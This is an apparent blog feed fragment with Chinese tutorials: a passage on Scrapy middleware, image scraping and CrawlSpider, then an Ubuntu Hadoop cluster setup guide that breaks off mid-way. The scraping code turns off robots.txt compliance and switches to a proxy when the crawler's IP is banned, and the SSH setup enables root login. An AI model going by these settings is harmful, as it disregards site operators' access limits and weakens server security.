class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MidSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;mid&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.baidu.com&#x27;</span>, <span class="string">&#x27;https://www.sogou.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在配置文件setting.py中启用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">&#x27;middle.middlewares.MiddleDownloaderMiddleware&#x27;</span>: <span class="number">543</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动工程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro middle %scrapy crawl mid</span><br><span class="line">我是process_request()</span><br><span class="line">我是process_request()</span><br><span class="line">我是process_response()</span><br><span class="line">我是process_exception()</span><br><span class="line">我是process_response()</span><br><span class="line">我是process_exception()</span><br></pre></td></tr></table></figure><p>process_exception()方法设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拦截异常请求</span></span><br><span class="line"><span class="comment"># request就是拦截到的异常请求的请求对象</span></span><br><span class="line"><span class="comment"># 作用:修正异常请求,将其 重新发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span><br><span class="line">    <span class="comment"># 请求的ip被禁,该请求就会变成一个异常请求,加入代理</span></span><br><span class="line">    request.meta[<span class="string">&#x27;proxy_&#x27;</span>] = <span class="string">&#x27;https://ip:port&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_exception()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将异常的请求修正后重新发送</span></span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line">    <span class="comment"># 可能会造成死循环,因为如果加入代理后依旧发生异常,会再次加入代理去请求</span></span><br></pre></td></tr></table></figure><p>process_request()方法设置headers</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">    <span class="comment"># 设置请求头,但一般不这么写,可以在setting.py中设置全局</span></span><br><span class="line">    request.headers[<span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    request.headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_request()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>process_response()方法篡改响应数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拦截所有响应对象</span></span><br><span class="line"><span class="comment"># request就是response响应对象对应的请求对象,response就是拦截到的响应对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response, spider</span>):</span><br><span class="line">    <span class="comment"># 篡改响应数据</span></span><br><span class="line">    response.text = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_response()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h2 id="大文件下载-爬取jdlingyu-com图片"><a href="#大文件下载-爬取jdlingyu-com图片" class="headerlink" title="大文件下载-爬取jdlingyu.com图片"></a>大文件下载-爬取jdlingyu.com图片</h2><p>文件目录</p><p><img src="/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/img_2.png" alt="1"></p><p>img.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> imgdownload.items <span class="keyword">import</span> ImgdownloadItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;img&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.jdlingyu.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        li_list = response.xpath(<span class="string">&#x27;/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> li_list:</span><br><span class="line">            url = a.xpath(<span class="string">&#x27;./div/div[2]/h2/a/@href&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            title = a.xpath(<span class="string">&#x27;./div/div[2]/h2/a/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 传递给itme</span></span><br><span class="line">            item = ImgdownloadItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 回调并传递参数</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=url, callback=self.get_img_url, meta=&#123;<span class="string">&#x27;item&#x27;</span>: item&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对每个图集的url发起请求</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_img_url</span>(<span class="params">self, response</span>):</span><br><span class="line">        page = <span class="number">0</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        <span class="comment"># 抓取每张图片的下载链接</span></span><br><span class="line">        img_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;primary-home&quot;]/article/div[2]/img&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> scr <span class="keyword">in</span> img_list:</span><br><span class="line">            img_url = scr.xpath(<span class="string">&#x27;./@src&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            page += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 传递给item</span></span><br><span class="line">            item[<span class="string">&#x27;img_url&#x27;</span>] = img_url</span><br><span class="line">            item[<span class="string">&#x27;page&#x27;</span>] = page</span><br><span class="line">            <span class="comment"># 提交给管道</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.py增加配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&#x27;ua&#x27;</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"><span class="comment"># 图片存放目录</span></span><br><span class="line">IMAGES_STORE = <span class="string">&#x27;./imgs&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>items.py增加字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgdownloadItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    img_url = scrapy.Field()</span><br><span class="line">    page = scrapy.Field()</span><br></pre></td></tr></table></figure><p>pipelines.py增加管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> ItemAdapter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认管道类无法请求图片数据</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgdownloadPipeline</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受图片地址和title,然后对其进行请求存储到本地</span></span><br><span class="line"><span class="comment"># 提供了数据下载功能,也可以下载视频和音频</span></span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.images <span class="keyword">import</span> ImagesPipeline</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承ImagesPipeline类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">img_download</span>(<span class="title class_ inherited__">ImagesPipeline</span>):</span><br><span class="line">    <span class="comment"># 重写三个父类方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_media_requests</span>(<span class="params">self, item, info</span>):</span><br><span class="line">        <span class="comment"># 下载,并传参,如果传递整个item,最后只会下载一张图片,原因未知</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(url=item[<span class="string">&#x27;img_url&#x27;</span>], meta=&#123;<span class="string">&#x27;title&#x27;</span>: item[<span class="string">&#x27;title&#x27;</span>], <span class="string">&#x27;page&#x27;</span>: item[<span class="string">&#x27;page&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回图片保存路径</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">file_path</span>(<span class="params">self, request, response=<span class="literal">None</span>, info=<span class="literal">None</span>, *, item=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># 拼接路径</span></span><br><span class="line">        title = request.meta[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        page = request.meta[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">        path = <span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>/<span class="subst">&#123;page&#125;</span>.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回路径</span></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将item返回给下一个即将被执行的管道类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">item_completed</span>(<span class="params">self, results, item, info</span>):</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>setting.py增加管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="comment">#&#x27;imgdownload.pipelines.ImgdownloadPipeline&#x27;: 300,</span></span><br><span class="line">   <span class="string">&#x27;imgdownload.pipelines.img_download&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/img_3.png" alt="1"></p><h2 id="CrawlSpider-深度爬取"><a href="#CrawlSpider-深度爬取" class="headerlink" title="CrawlSpider 深度爬取"></a>CrawlSpider 深度爬取</h2><p>是什么</p><pre><code>是Spider的一个子类,也就是爬虫文件的父类</code></pre><p>作用:用作于全站数据的爬取</p><pre><code>将一个页面下所有的页码进行爬取</code></pre><p>基本使用</p><pre><code>1.创建一个工程2.创建一个基于CrawlSpider类的爬虫文件    crapy genspider -t crawl main www.xxx.com3.执行工程</code></pre><p>编写工程文件main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainSpider</span>(<span class="title class_ inherited__">CrawlSpider</span>):</span><br><span class="line">    name = <span class="string">&#x27;main&#x27;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&#x27;https://www.mn52.com/&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.mn52.com/fj/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 链接提取器,根据allow里的正则来提取url</span></span><br><span class="line">    rules = (</span><br><span class="line">        <span class="comment"># 对提取的url发起请求,然后回调解析</span></span><br><span class="line">        <span class="comment"># 如果allow为空 将抓取此页面下的链接</span></span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;list_8_\d.html&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_item</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行工程</p><pre><code>可以看到抓取了所有页码的url</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro crawl %scrapy crawl main</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_2.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_3.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_4.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_8.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_5.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_7.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_9.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_6.html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;创建项目&quot;&gt;&lt;a href=&quot;#创建项目&quot; class=&quot;headerlink&quot; title=&quot;创建项目&quot;&gt;&lt;/a&gt;创建项目&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy startproject tutorial&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;创建任务&quot;&gt;&lt;a href=&quot;#创建任务&quot; class=&quot;headerlink&quot; title=&quot;创建任务&quot;&gt;&lt;/a&gt;创建任务&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy genspider first www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;会生成一个first文件&lt;/p&gt;</summary>
    
    
    
    <category term="爬虫" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="教程" scheme="http://example.com/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="scrapy" scheme="http://example.com/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu下大数据集群搭建</title>
    <link href="http://example.com/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</id>
    <published>2022-03-01T14:02:18.000Z</published>
    <updated>2022-04-20T12:31:38.483Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-配置ip-三个节点"><a href="#一-配置ip-三个节点" class="headerlink" title="一.配置ip(三个节点)"></a>一.配置ip(三个节点)</h3><p>自ubuntu17之后多了一种配置方式更加高效,也就是netplan</p><p>1.1编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># gedit /etc/netplan/01-network-manager-all.yaml</span></span><br></pre></td></tr></table></figure><p>配置内容如下,<code>注意缩进</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line"> <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"> <span class="attr">renderer:</span> <span class="string">NetworkManager</span></span><br><span class="line"> <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">ens33:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line">      <span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">192.168</span><span class="number">.10</span><span class="number">.101</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">gateway4:</span> <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>, <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>]</span><br></pre></td></tr></table></figure><p>1.2使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># netplan apply</span></span><br></pre></td></tr></table></figure><p>如果没有报错则配置成功</p><h3 id="二-配置主机名和主机名映射-三个节点"><a href="#二-配置主机名和主机名映射-三个节点" class="headerlink" title="二.配置主机名和主机名映射(三个节点)"></a>二.配置主机名和主机名映射(三个节点)</h3><p>1.1配置主机名并查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">重启后生效</span><br><span class="line">root@master:/etc/netplan<span class="comment"># hostnamectl set-hostname master</span></span><br><span class="line">root@master:/etc/netplan<span class="comment"># hostname</span></span><br></pre></td></tr></table></figure><p>1.2配置主机名映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># gedit /etc/hosts</span></span><br></pre></td></tr></table></figure><p>添加以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.10.101 master</span><br><span class="line">192.168.10.102 slave1</span><br><span class="line">192.168.10.103 slave2</span><br></pre></td></tr></table></figure><p>1.3ping测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有以下回显证明配置成功</span><br><span class="line">root@master:/etc/netplan<span class="comment"># ping slave2</span></span><br><span class="line">PING slave2 (192.168.10.103) 56(84) bytes of data.</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms</span><br></pre></td></tr></table></figure><p>1.4将hosts文件分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># scp /etc/hosts root@slave1:/etc/</span></span><br><span class="line">输入<span class="built_in">yes</span>再输入密码</span><br></pre></td></tr></table></figure><h3 id="三-配置ssh免密登录-三个节点"><a href="#三-配置ssh免密登录-三个节点" class="headerlink" title="三.配置ssh免密登录(三个节点)"></a>三.配置ssh免密登录(三个节点)</h3><p>因为Ubuntu并不自带ssh服务所以要安装ssh并配置允许root远程登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line">启动</span><br><span class="line">sudo service ssh start</span><br><span class="line">配置</span><br><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line">添加一条</span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>1.生成密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">一直回车</span><br></pre></td></tr></table></figure><p>2.将密钥写入authorized.keys文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@master:~<span class="comment"># cd .ssh/</span></span><br><span class="line">root@master:~/.ssh<span class="comment"># cat id_rsa.pub &gt;&gt; authorized_keys</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.在另外两个子节点执行以上操作,并将authorized.keys的内容复制进master主机的authorized.keys文件末尾,成功后如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/.ssh<span class="comment"># cat authorized.keys </span></span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master</span><br><span class="line">ssh-dss AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1</span><br><span class="line">ssh-dss 